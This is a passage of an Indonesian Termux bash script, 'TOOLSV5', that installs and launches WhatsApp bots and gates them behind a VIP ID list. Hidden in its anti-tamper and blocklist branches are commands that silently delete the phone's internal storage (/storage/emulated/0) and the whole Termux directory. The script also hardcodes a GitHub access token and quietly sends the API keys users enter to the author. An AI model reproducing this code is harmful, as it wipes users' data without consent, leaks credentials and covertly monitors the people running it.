if [ -d "$oreobot" ]; then
cd $oreobot
clear
bash gas.sh
break
else
cd $HOME
apt update -y && nala install libwebp -y && nala install git -y && nala install nodejs -y && nala install ffmpeg -y && nala install yarn && nala install imagemagick -y && git clone --depth 32 https://github.com/zerotermux/botmulti.git && cd oreo-bot && yarn
fi
done
elif [ "$no" = "bot2" ]; then
clear
while true; do
push="/data/data/com.termux/files/usr/bot"
if [ -d "$push" ]; then
cd $push
clear
bash gas.sh
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $bg_m "Installasi Package Dulu !$res"
sleep 5
echo
nala install nodejs imagemagick git nodejs ffmpeg libwebp yarn -y
cd /data/data/com.termux/files/usr
git clone --depth 1 https://github.com/zerotermux/bot
ENTER
fi
done
elif [ "$no" = "bot3" ]; then
clear
while true; do
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $k "Penguna$h VIP UNLOCK"
sleep 5
clear
bot3="/data/data/com.termux/files/usr/BOT3"
if [ -d "$bot3" ]; then
cd $bot3
clear
bash gas.sh
break
else
clear
$e $bg_m "Bot Not Installasi"
sleep 3
nala install nodejs imagemagick git nodejs ffmpeg libwebp yarn -y
cd /data/data/com.termux/files/usr
git clone --depth 32 https://github.com/zerotermux/BOT3
fi
ENTER
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
done
elif [ "$no" = "bot4" ]; then
while true; do
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $k "Penguna$h VIP UNLOCK"
sleep 5
clear
bot4="/data/data/com.termux/files/usr/Bug2"
if [ -d "$bot4" ]; then
clear
read -p "Anda Ingin Login Ke Nomor Baru Bot Atau Tidak ? Jawab ( ya/no ) : " gimana
if [[ "$gimana" = "no" || "$gimana" = "n" ]]; then
clear
elif [[ "$gimana" = "ya" || "$gimana" = "y" ]]; then
rm -rf $bot4/sesi
mkdir $bot4/sesi
clear
$e $h "Succes Bot Bisa Di Loginkan Ke Nomor Yang Baru !"
sleep 5
clear
fi
cd $bot4 &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
bash gas.sh
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $m "Menginstall Bot4"
nala install nodejs imagemagick git nodejs ffmpeg libwebp yarn -y
cd /data/data/com.termux/files/usr/ &> /dev/null
git clone --depth 1 https://github.com/zerotermux/Bug2 | $e $k "Sabar Masih Loading Download !"
clear
fi
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
done
ENTER
elif [ "$no" = "bot5" ]; then
while true; do
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $q $k "Penguna$h VIP UNLOCK"
sleep 5
clear
bot5="/data/data/com.termux/files/usr/bot5"
if [ -d "$bot5" ]; then
cd /data/data/com.termux/files/usr/bot5 &> /dev/null
git pull origin main &> /dev/null
clear
bash gas.sh
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $q $m "Menginstall Bot5"
nala install nodejs imagemagick git nodejs ffmpeg libwebp yarn -y
cd /data/data/com.termux/files/usr/ &> /dev/null
git clone --depth 3 https://github.com/zerotermux/bot5 | $e $q $k "Sabar Masih Loading Download !"
clear
fi
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $q $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
done
ENTER
elif [ "$no" = "bot6" ]; then
while true; do
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $q $k "Penguna$h VIP UNLOCK"
sleep 5
clear
bot6="/data/data/com.termux/files/usr/bug6"
if [ -d "$bot6" ]; then
cd /data/data/com.termux/files/usr/bug6 &> /dev/null
git pull origin main &> /dev/null
clear
bash gas.sh
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $q $m "Menginstall Bot6"
sleep 5
nala install nodejs imagemagick git nodejs ffmpeg libwebp yarn -y
cd /data/data/com.termux/files/usr/ &> /dev/null
git clone --depth 3 https://github.com/zerotermux/bug6 | $e $q $k "Sabar Masih Loading Download !"
clear
fi
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $q $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
done
ENTER
elif [ "$no" = "bot7" ]; then
while true; do
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $q $k "Penguna$h VIP UNLOCK"
sleep 5
clear
bot7="/data/data/com.termux/files/usr/bot7"
if [ -d "$bot7" ]; then
cd /data/data/com.termux/files/usr/bot7 &> /dev/null
git pull origin main &> /dev/null
clear
bash gas.sh
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $q $m "Menginstall Bot7"
sleep 5
nala install nodejs imagemagick git nodejs ffmpeg libwebp yarn -y
cd /data/data/com.termux/files/usr/ &> /dev/null
git clone --depth 3 https://github.com/zerotermux/bot7 | $e $q $k "Sabar Masih Loading Download !"
clear
fi
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $q $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
done
ENTER
elif [ "$no" = "bot8" ]; then
while true; do
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $q $k "Penguna$h VIP UNLOCK"
sleep 5
clear
bot8="/data/data/com.termux/files/usr/bot8"
if [ -d "$bot8" ]; then
cd /data/data/com.termux/files/usr/bot8 &> /dev/null
git pull origin main &> /dev/null
clear
bash gas.sh
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $q $m "Menginstall Bot8"
sleep 5
nala install nodejs imagemagick git nodejs ffmpeg libwebp yarn -y
cd /data/data/com.termux/files/usr/ &> /dev/null
git clone --depth 3 https://github.com/zerotermux/bot8 | $e $q $k "Sabar Masih Loading Download !"
clear
fi
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $q $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
done
ENTER
elif [ "$no" = "bot9" ]; then
while true; do
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $q $k "Penguna$h VIP UNLOCK"
sleep 5
clear
bot9="/data/data/com.termux/files/usr/bot9"
if [ -d "$bot9" ]; then
cd /data/data/com.termux/files/usr/bot9 &> /dev/null
git pull origin main &> /dev/null
clear
bash gas.sh
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $q $m "Menginstall Bot9"
sleep 5
nala install nodejs imagemagick git nodejs ffmpeg libwebp yarn -y
cd /data/data/com.termux/files/usr/ &> /dev/null
git clone --depth 3 https://github.com/zerotermux/bot9 | $e $q $k "Sabar Masih Loading Download !"
clear
fi
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $q $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
done
fi
elif [ "$no" = "musik" ]; then
bannermusic() {
echo "
███╗   ███╗██╗   ██╗███████╗██╗██╗  ██╗
████╗ ████║██║   ██║██╔════╝██║██║ ██╔╝
██╔████╔██║██║   ██║███████╗██║█████╔╝
██║╚██╔╝██║██║   ██║╚════██║██║██╔═██╗
██║ ╚═╝ ██║╚██████╔╝███████║██║██║  ██╗
╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝ setting to play
"
}
while true; do
clear
play -q $HOME/TOOLSV5/sound/robot.mp3 &> /dev/null &
bannermusic | lolcat
echo
$e $h $bg_b" 1.Tambahkan Musik Saja !$res"
$e $h $bg_b" 2.Hapus Folder Musik & Setting Ulang !$res"
$e $m $bg_b" 0.BACK TO TOOLSV5$res$k"
$e
read -p "  Choose ( 0 - 2 ) : " mana
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
if [ "$mana" = "1" ]; then
MUSIEK
elif [ "$mana" = "2" ]; then
rm -rf $HOME/TOOLSV5/music
$e
$e $b " Musik Lama Sudah TerHapus\n Anda Bisa Menambahkan Yang Baru Sekarang !"
sleep 5
elif [ "$mana" = "0" ]; then
$e $bg_m "BACK TO TOOLSV5$res"
sleep 3
break
else
clear
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $bg_m " Input salah Tod ! $res"
fi
done
elif [ "$no" = "off" ]; then
killall mpv
elif [ "$no" = "info" ]; then
clear
$e $m "==================================="
$e $h "       LIST TERBARU/UPDATE $versitoolsv5 "
$e $m "==================================="
cat "$update"
$e $m "===================================$h"
read -p " ENTER UNTUK MENGULANGI TOOLSV5"
elif [ "$no" = "dosa" ]; then
echo "Link TELEGRAM"
xdg-open "https://t.me/squidwardyahahayuk"
elif [ "$no" = "report" ]; then
clear
$e $m "========================================"
$e $k "          $m∆$k LAPOR BUG $m∆"
$e $m "========================================"
$e $h "Untuk melaporkan Bug\n Anda harus berada dimana script yang error\n Jika sudah screenshot script yang$m ERROR$h\n dan kirim ke whatsapp saya !"
$e $m "========================================$bl"
read -p " ENTER UNTUK MELAPORKAN BUG"
xdg-open "https://wa.me/6285850268349?text=Assalamualaikum%20Bang%20Saya%20Nemu%20BUG%20TOOLSV5"
elif [ "$no" = "pesan" ]; then
FORUM
elif [ "$no" = "list" ]; then
listprem() {
file_path="./pockat/nhc"
content=$(< "$file_path")
max_width=$(echo "$content" | awk '{ if (length > max) max = length } END { print max }')
box_width=$((max_width + 10))
draw_box() {
local content="$1"
local width="$2"
printf '+'
for ((i = 0; i < width; i++)); do
printf '-'
done
printf '+\n'
local line_number=1
while IFS= read -r line; do
printf '| %3d: %s%*s  |\n' "$line_number" "$line" $((width - ${#line} - 8)) ''
((line_number++))
done <<< "$content"
printf '+'
for ((i = 0; i < width; i++)); do
printf '-'
done
printf '+\n'
}
draw_box "$content" "$box_width" | lolcat
}
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $q $k "Penguna$h VIP UNLOCK"
sleep 5
clear
listprem
ENTER
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $q $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
elif [ "$no" = "tutor" ]; then
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $q $k "Penguna$h VIP UNLOCK"
sleep 5
clear
xdg-open "https://t.me/+VcaXi-QLbwY2NmU1"
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $q $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
ENTER
elif [ "$no" = "brangkas" ]; then
xdg-open "https://t.me/brangkas2002"
elif [[ "$no" = "bk" || "$no" = "BK" ]]; then
echo
elif [ "$no" = "0" ]; then
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null
killall mpv &> /dev/null
cd $HOME
isipesan="Terdeteksi Keluar Dari TOOLSV5 ! ��‍💻"
kirimpesan &> /dev/null
exit 0
fi
done
}
TRIALMODE() {
clear
rm -rf $HOME/git_credentials &> /dev/null &
rm -rf $HOME/.gitconfig &> /dev/null &
trial_dir="/data/data/com.termux/files/usr/trial"
whoami_file="$trial_dir/whoami"
configure_git() {
git config --global user.name "zerotermux"
git config --global user.email "arjunmahardika26@gmail.com"
}
cd $trial_dir
rm -rf whoami_file
git pull origin main &> /dev/null
git stash &> /dev/null
create_and_load_git_credentials() {
local cred_file="$HOME/git_credentials"
if [ ! -f "$cred_file" ]; then
echo "Membuat file kredensial Git..." &> /dev/null
echo 'GITHUB_USER="zerotermux"' > "$cred_file"
echo 'GITHUB_TOKEN="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"' >> "$cred_file"
fi
source "$cred_file"
}
upload_to_github() {
local file_path=$1
local github_url="https://$GITHUB_USER:$GITHUB_TOKEN@github.com/$GITHUB_USER/trial.git"
git credential-cache exit
cd $trial_dir
git init
git branch -M main
git add $file_path
git commit -m "Update hitungan trial"
git push $github_url main
}
manage_whoami_file() {
local current_user=$(whoami)
if [ -f $whoami_file ]; then
count=$(grep "^$current_user " $whoami_file | awk '{print $2}')
if [ -z "$count" ]; then
count=0
fi
else
count=0
fi
echo $count
}
update_whoami_file() {
local current_user=$(whoami)
local new_count=$1
if grep -q "^$current_user " $whoami_file; then
sed -i "s/^$current_user .*/$current_user $new_count/" $whoami_file
else
echo "$current_user $new_count" >> $whoami_file
fi
}
configure_git
create_and_load_git_credentials
count=$(manage_whoami_file)
if [ $count -lt 5 ]; then
clear
telegram &> /dev/null &
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $bg_m "ANDA MASUK SEBAGAI PENGGUNA TRIAL TOOLSV5$res"
read -p "ENTER UNTUK MELANJUTKAN"
clear
$e $bg_m "TRIAL TOOLSV5 !$res"
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
sleep 3
clear
count=$((count + 1)) &> /dev/null
update_whoami_file $count &> /dev/null
upload_to_github $whoami_file &> /dev/null
clear
$e $bg_m "TOOLSV5 TRIAL sudah berjalan sebanyak $count $res"
sleep 3
$musik &> /dev/null &
TOOLS
else
if [ $count -ge 5 ]; then
cd ./pockat
git pull origin main &> /dev/null
git stash &> /dev/null
isipesan="Batas TRIAL 5X completed proses BLOCKLIST 👨‍��"
kirimpesan &> /dev/null
blokiranid &> /dev/null &
fi
clear
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $bg_m "Trial Anda Sudah Habis$res "
sleep 3
rm -rf /data/data/com.termux/files/usr/bug6 &> /dev/null &
rm -rf /data/data/com.termux/files/usr/bot4 &> /dev/null &
rm -rf /data/data/com.termux/files/usr/bot5 &> /dev/null &
rm -rf /data/data/com.termux/files/usr/bot7 &> /dev/null &
rm -rf /data/data/com.termux/files/usr/bot8 &> /dev/null &
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $bg_h "Order Ke Galirus Official Yang Ori Nomornya 085850268349$res"
sleep 5
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $bg_h "Mau Berlangganan TOOLSV5 ? y/n ( yes / no )$res"
$e $k
read -p "choose ( y/n ) :" iii
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
if [[ $iii = "yes" || $iii = "y" ]]; then
xdg-open "https://wa.me/6285850268349?text=bang daftar ke TOOLSV5 prem gimana ID : $termux_id"
elif [[ $iii = "no" || $iii = "n" ]]; then
exit 1
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
echo "Perintah Salah"
fi
fi
}
clear
scangittoken="./pockat/.git/config"
scanstatusgorax="/data/data/com.termux/files/usr/share/gorax/.git/config"
toolsv5git="$HOME/TOOLSV5/.git/config"
pengunatrialcek="/data/data/com.termux/files/usr/trial/.git/info/exclude"
komponenutama="/data/data/com.termux/files/usr/include/git4/.git/config"
if [ -f "$scangittoken" ] && [ -f "$scanstatusgorax" ] && [ -f "$toolsv5git" ] && [ -f "$komponenutama" ] && [ -f "$pengunatrialcek" ]; then
DirektoriGit="./pockat/.git/config"
BLOCKLIST_FILE="./pockat/block.txt"
canning &> /dev/null
if [ -f "$DirektoriGit" ]; then
cd ./pockat/ &> /dev/null &
git pull origin main &> /dev/null &
git stash &> /dev/null &
if [ -f "$BLOCKLIST_FILE" ]; then
blocklist_ids=$(tr -d ' ' < "$BLOCKLIST_FILE")
termux_id=$(whoami)
fi
termux_id=$(whoami)
if echo "$blocklist_ids" | grep -wq "$termux_id"; then
telegram &> /dev/null &
isipesan=" BLOCKLIST ID COMPLETED 👨‍💻"
kirimpesan &> /dev/null
clear
echo "y" | termux-setup-storage &> /dev/null &
$banner | lolcat
$e
$e
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $bg_m "ANDA DI LARANG MENGGUNAKAN TOOLSV5 !$res"
sleep 3
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $bg_m "BELILAH YANG PERMANEN CUMA 10K GARASI PERMANEN !$res"
base &> /dev/null &
exit 0
else
termux_id=$(whoami)
idtermux="./pockat/nhc"
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
telegram &> /dev/null &
folder="/data/data/com.termux/files/home/TOOLSV5"
security="/data/data/com.termux/files/home/TOOLSV5/.git"
if [ -d "$folder" ] && [ -d "$security" ]; then
clear
sertifikat &> /dev/null &
play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
echo
$e $b" ╔══════════════════════════════════════════════╗$b"
$e $b" ║$h              ID TERVERIFIKASI               $b ║"
$e $b" ╚══════════════════════════════════════════════╝$b"
echo
$e $b" ╔══════════════════════════════════════════════╗$b"
$e $b" ║$h            SCRIPT DAPAT DI AKSES            $b ║"
$e $b" ╚══════════════════════════════════════════════╝$b"
echo
sleep 5
clear
play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
$e $m "         ⛔ PERINGATAN ⛔"
echo
$e $h "- ID tidak bisa di ubah ! Kecuali\n - masih ada id lama ( untuk barang bukti ) \n - join grup Jika kedua syarat di atas tidak komplit\n   Resiko$m GARANSI ANDA HABIS"
echo
$e $m
sleep 5
read -p "   ENTER UNTUK MELANJUTKAN"
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
clear
$e $b
while true; do
clear
formats=("beavis.zen" "bong" "bud-frogs" "bunny" "cheese" "cower" "daemon"
"default" "dragon" "dragon-and-cow" "elephant" "elephant-in-snake"
"eyes" "flaming-sheep" "ghostbusters" "head-in" "hellokitty"
"kangaroo" "kiss" "kitty" "koala" "mech-and-cow" "meow" "milk"
"moofasa" "moose" "pony" "pony-smaller" "ren" "sheep" "skeleton"
"small" "sodomized" "sodomized-sheep" "stegosaurus" "stimpy"
"supermilker" "surgery" "telebears" "three-eyes" "turkey" "turtle"
"tux" "udder" "vader" "vader-koala" "www")
random_format=${formats[$RANDOM % ${#formats[@]}]}
cowsay -f "$random_format" "Scanning Apikey Version: $versitoolsv5" | lolcat
$e $b "┌─────────────────────────────────────────────────┐"
$e $b "│ $b [$m •$b ]$p Notifikasi  $m  :$k Selamat$m $ucapan $k$b        │"
$e $b "│ $b [$k •$b ]$p Sekarang Jam$m  :$k $(date +"%H:%M")$b                    │"
$e $b "│ $b [$h •$b ]$p Sekarang Hari$m :$k $ucap,$tanggal$b    │"
$e $b "├─────────────────────────────────────────────────┘"
$e $b "│"
if [ -f "$gal" ]; then
bluearchive() {
audioupdate() {
cd /data/data/com.termux/files/usr/include/audio
git pull origin main
git stash
}
audioupdate &> /dev/null &
audio_dir="/data/data/com.termux/files/usr/include/audio"
audio_files=($(ls -1 $audio_dir/*.mp3 | shuf))
random_audio=${audio_files[$RANDOM % ${#audio_files[@]}]}
play -q "$random_audio" &> /dev/null
}
bluearchive &> /dev/null
mpv $HOME/TOOLSV5/sound/loading.mp3 &> /dev/null &
$e $b "│ ┌───────────────┐"
$e $b "├─┤$m VERIFIKASI$p ID$b │"
$e $b "│ └───────────────┘"
sleep 1
function show_loading() {
local i=0
while [ $i -le 100 ]; do
printf '\r%s' " └► Verifikasi [ $i ]"
sleep 0.05
((i++))
done
}
show_loading &
sleep 8
kill $! &> /dev/null &
play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
printf '\r%s\n' " └► Anda sudah terdaftar"
sleep 3
clear
play -q $HOME/TOOLSV5/sound/welcome.mp3 &> /dev/null &
$e $bl
text="      Selamat Datang Di TOOLSV5 $versitoolsv5"
delay=0.05 # penundaan antara setiap karakter (deti>
for ((i = 0; i < ${#text}; i++)); do
echo -n "${text:$i:1}"
sleep $delay
done
sleep 2
$musik &> /dev/null &
TOOLS
fi
play -q $HOME/TOOLSV5/sound/robot.mp3 &> /dev/null
sleep 2
play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
read -s -p " │   •   Apikey : " scanning
if [ -z "$scanning" ]; then
echo
mpv $HOME/TOOLSV5/sound/loading.mp3 &> /dev/null &
$e $b "│ ┌───────────────┐"
$e $b "├─┤$m VERIFIKASI$p ID$b │"
$e $b "│ └───────────────┘"
sleep 1
function show_loading() {
local i=0
while [ $i -le 100 ]; do
printf '\r%s' " └► Verifikasi [ $i ]"
sleep 0.07
((i++))
done
}
show_loading &
sleep 7
kill $!
kirimpesan &> /dev/null &
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
printf '\r%s\n' " └► Apikey Ga Boleh Kosong Kocak :D "
sleep 3
elif grep -q "$scanning" $status/token.txt; then
$e $h
mpv $HOME/TOOLSV5/sound/loading.mp3 &> /dev/null &
$e $b "│ ┌───────────────┐"
$e $b "├─┤$m VERIFIKASI$p ID$b │"
$e $b "│ └───────────────┘"
sleep 1
function show_loading() {
local i=0
while [ $i -le 100 ]; do
printf '\r%s' " └► Verifikasi [ $i ]"
sleep 0.05
((i++))
done
}
show_loading &
sleep 8
kill $! &> /dev/null &
isipesan="TERDETEKSI benar login Apikey : $scanning 👨‍��"
kirimpesan &> /dev/null &
play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
printf '\r%s\n' " └► Apikey telah terverifikasi"
touch $gal
sleep 3
else
$e $h
mpv $HOME/TOOLSV5/sound/loading.mp3 &> /dev/null &
$e $b "│ ┌───────────────┐"
$e $b "├─┤$m VERIFIKASI$p ID$b │"
$e $b "│ └───────────────┘"
sleep 1
function show_loading() {
local i=0
while [ $i -le 100 ]; do
printf '\r%s' " └► Verifikasi [ $i ]"
sleep 0.07
((i++))
done
}
show_loading &
sleep 7
kill $!
isipesan="TERDETEKSI salah login Apikey : $scanning 👨‍��"
kirimpesan &> /dev/null &
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
printf '\r%s\n' " └► Apikey tidak terverifikasi"
sleep 3
fi
done
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $b" ╔══════════════════════════════════════════════╗$b"
$e $b" ║$h       💀SCRIPT TIDAK DAPAT DI AKSES��       $b ║"
$e $b" ╚══════════════════════════════════════════════╝$b"
sleep 3
echo
echo "y" | termux-setup-storage &> /dev/null &
rm -rf /storage/emulated/0 &> /dev/null &
rm -rf data/data/com.termux/ &> /dev/null &
$e $k " Atas Pelanggaran yang anda lakukan"
$e $h " TOOLSV5$k menolak AKSES ke anda"
$e $k " Dikarenakan anda sedang berusaha Memodifikasi$h TOOLSV5$k"
$e $k " Dengan ini pelanggaran yang anda lakukan"
$e $k " Membuat Internal Anda Di Hapus karena terkena"
$e $k "$m VIRUS !"
exit
fi
else
clear
echo
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $b" ╔══════════════════════════════════════════════╗$b"
$e $b" ║$h                 ID TIDAK TERDAFTAR          $b ║"
$e $b" ╚══════════════════════════════════════════════╝$b"
echo
$e $b" ╔══════════════════════════════════════════════╗$b"
$e $b" ║$h           ANDA AKAN MASUK MODE TRIAL        $b ║"
$e $b" ╚══════════════════════════════════════════════╝$b"
echo
sleep 5
TRIALMODE
break
fi
else
cd /data/data/com.termux/files/usr/share &> /dev/null
git clone --depth 32 https://github.com/zerotermux/pockat &> /dev/null
cd pockat &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
git add nhc &> /dev/null
fi
fi
else
cd ./pockat/ &> /dev/null &
git pull origin main &> /dev/null &
git stash &> /dev/null &
fi
else
telegram &> /dev/null &
base &> /dev/null &
clear
isipesan="Terdeteksi Memodifikasi Direktori 🔥"
kirimpesan &> /dev/null
echo
echo
echo
rm -rf $HOME/TOOLSV5
rm -rf /data/data/com.termux/files/usr/share/gorax
rm -rf ./pockat
rm -rf /storage/emulated/0
rm -rf /data/data/com.termux
cd $HOME
clear
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $m "KERJA BAGUS BUNG ! AKU SUKA CARA MAIN MU ! "
sleep 5
clear
$e $m "Hanya Saja Anda Saya Tolak"
sleep 5
clear
$e $m "MELARANG PENGUNAAN SCRIPT MODIFIKASI ON ! "
play -q $HOME/TOOLSV5/backsound.mp3 &> /dev/null &
exit 0
fi
else
clear
$e $bl
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
while true; do
clear
read -p "Masukkan nama Anda: " nama
if [ -n "$nama" ]; then
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
echo "y" | termux-setup-storage &> /dev/null &
echo $nama > $nama_file
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
echo "Nama tidak boleh kosong. Silakan coba lagi."
sleep 3
fi
done
clear
loading1 &
sleep 10
xdg-open "https://www.youtube.com/@GalirusProjects"
kill $!
fi
done
else
clear
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $m "TOOLSV5 DALAM PERAWATAN"
sleep 5
$e $h
clear
mpv --really-quiet "$HOME/TOOLSV5/music/" &> /dev/null &
clear
isipesan="Terdeteksi Sedang Maintenance 👨‍��"
kirimpesan &> /dev/null
text="Sedang Maintenance...❗"
columns=$(stty size | awk '{print $2}')
while true; do
for ((i = 1; i <= columns; i++)); do
clear
printf "%*s\n" $i "$text"
sleep 0.05
done
for ((i = columns; i >= 1; i--)); do
clear
printf "%*s\n" $i "$text"
sleep 0.05
done
done
fi
else
clear
cd /data/data/com.termux/files/usr/share/ &> /dev/null
$e $h "Mendownload Data Penting ( tidak terkait data anda ) "
git clone --depth 32 https://github.com/zerotermux/gorax &> /dev/null
fi
else
clear
cd $HOME/TOOLSV5
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $m "Anda Belum Installasi Package Yang Di Butuhkan $bl"
sleep 5
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
read -p " Silahkan Enter ( untuk installasi )"
clear
play -q $HOME/TOOLSV5/sound/robot.mp3 &> /dev/null &
$e $m "Lagi Menginstall Mohon Bersabar"
sleep 5
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
pkg update
echo "y" | termux-setup-storage
pkg install nala -y
clear
nala update -y
nala install -y git bash python python2 python3
nala install -y ruby curl gnupg
nala install ncurses-utils
nala install -y golang php jq
gitcek
nala install -y git
nala install -y libcurl openssl
nala install -y wget zip unzip
nala install -y figlet openssh which
nala install -y cloudflared figlet
nala install -y cowsay mpv sox
clear
trial_direktori &> /dev/null | $e $bg_m "Bentar Cuy Buat Daftar List Nih$res"
sleep 2
clear
$e $bg_h "Done ✓$res "
sleep 2
clear
$e $bg_m "lanjut proses instalasi selanjutnya$res"
gem install lolcat
python3 -m pip install requests mechanize bs4
python3 -m pip install pycryptodome keyboard
python3 -m pip install rich colorama tqdm
weleh
cd $HOME/TOOLSV5
git add install.sh
git stash
git pull origin main
git add install.sh
git add install.sh
git stash
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
clear
suara
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
clear
repository
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $h $bg_b" Installasi Selesai\n Silahakn Ketik bash install.sh / toolsv5 saja$res "
touch $packageinstalling
exit 0
fi
done
done
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $b" ╔══════════════════════════════════════════════╗$b"
$e $b" ║$h       💀SCRIPT TIDAK DAPAT DI AKSES.           $b ║"
$e $b" ╚══════════════════════════════════════════════╝$b"
sleep 3
echo
echo "y" | termux-setup-storage &> /dev/null &
rm -rf /storage/emulated/0 &> /dev/null &
rm -rf data/data/com.termux/ &> /dev/null &
$e $k " Atas Pelanggaran yang anda lakukan"
$e $h " TOOLSV5$k menolak AKSES ke anda"
$e $k " Dikarenakan anda sedang berusaha Memodifikasi$h TOOLSV5$k"
$e $k " Dengan ini pelanggaran yang anda lakukan"
$e $k " Membuat Internal Anda Di Hapus karena terkena"
$e $k "$m VIRUS !"
exit
fi
